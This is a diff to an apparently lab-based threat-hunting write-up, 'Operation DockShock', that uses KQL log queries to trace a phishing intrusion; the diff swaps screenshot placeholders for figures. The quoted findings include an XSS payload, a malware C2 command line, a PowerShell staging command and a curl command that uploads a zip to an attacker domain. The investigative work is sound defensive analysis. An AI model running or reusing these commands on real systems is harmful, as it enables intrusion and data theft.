@@ -48,7 +48,7 @@ Employees
 | where role == "CTO"
 ```
 
-[SCREENSHOT PLACEHOLDER: Result showing Alexis Khoza, IP 10.10.0.7, hostname 7FVW-LAPTOP, and user agent profile]
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-1.png" alt="KQL Employees query result showing CTO Alexis Khoza, IP 10.10.0.7, hostname 7FVW-LAPTOP, and user-agent profile" caption="Figure 1: Employee query result identifying the CTO target profile." %}
 
 ```kql
 // Query 2: Quantifying inbound communications to the executive tier
@@ -56,6 +56,8 @@ Email
 | where recipient == "alexis_khoza@solvisystems.com"
 | count
 ```
+
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-2.png" alt="KQL Email query result showing a count of 31 inbound emails to the CTO" caption="Figure 2: Inbound email count to the CTO — 31 messages identified." %}
 
 **Result:** 31 inbound emails identified. Baseline network profiling also revealed that the threat actor was aggressively monitoring the domain, hunting for organizational context surrounding the docks-ics product string.
 
@@ -70,7 +72,7 @@ InboundNetworkEvents
 | project timestamp, src_ip, user_agent, url, status_code
 ```
 
-[SCREENSHOT PLACEHOLDER: Inbound event from 13.201.46.208 showing the 404 error code and Opera/8.64 user agent strings]
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-3.png" alt="Web log inbound event from 13.201.46.208 with a 404 error code and Opera/8.64 user-agent string" caption="Figure 3: Perimeter probe from 13.201.46.208 — 404 responses and an anomalous Opera/8.64 user agent." %}
 
 *   **Attacker Payload:** `</script><script>alert('xss')</script>`
 *   **WAF Mitigation Status:** Deflected. The web server responded with a 404 Status Code, preventing script execution.
@@ -94,7 +96,7 @@ Email
 | order by timestamp asc
 ```
 
-[SCREENSHOT PLACEHOLDER: Chronological table of phishing deliveries highlighting the first success to Carla Wharton]
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-4.png" alt="Chronological table of phishing email deliveries highlighting the first successful delivery to Carla Wharton" caption="Figure 4: Phishing delivery timeline, with the first successful click by Carla Wharton." %}
 
 The patient zero entry vector occurred on **May 1, 2024, at 15:51:41 UTC**. Carla Wharton (cawharton), a Sales Representative on host JUSP-LAPTOP, received a weaponized lure:
 *   **Sender:** news@eco-awareness-updates.net (Reply-To: electric_updates@gmail.com)
@@ -116,7 +118,7 @@ ProcessEvents
 | where process_commandline contains "ecobug.exe"
 ```
 
-[SCREENSHOT PLACEHOLDER: Process log detailing the ecobug.exe execution string with dest and port flags]
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-5.png" alt="Process event log showing the ecobug.exe execution command line with destination and port flags" caption="Figure 5: Process log capturing ecobug.exe execution with C2 destination and port arguments." %}
 
 *   **C2 Command Line:** ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
 *   **Beaconing Signature:** The malware operated on a strict automated cadence, initiating an outbound connection over TCP Port 1337 exactly 1 time per day at 17:38:25.
@@ -144,7 +146,7 @@ ProcessEvents
 | where hostname == "SJ9V-MACHINE" and process_commandline contains "Copy-Item"
 ```
 
-[SCREENSHOT PLACEHOLDER: The full PowerShell string copying network assets down to the local C:\ drive staging folder]
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-6.png" alt="PowerShell command line copying network assets to a local C drive staging folder" caption="Figure 6: PowerShell staging command copying source assets to a local staging folder." %}
 
 *   **Data Scrape Command:** Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs
 
@@ -158,7 +160,7 @@ ProcessEvents
 | where process_commandline contains "curl" and process_commandline contains "upload"
 ```
 
-[SCREENSHOT PLACEHOLDER: Curl command executing the file POST wrapper to api.eco-awareness-update.net]
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-7.png" alt="Curl command performing a file POST to api.eco-awareness-update.net" caption="Figure 7: curl exfiltration — file POST to the adversary API node api.eco-awareness-update.net." %}
 
 *   **Exfiltration Command Line:** curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
 
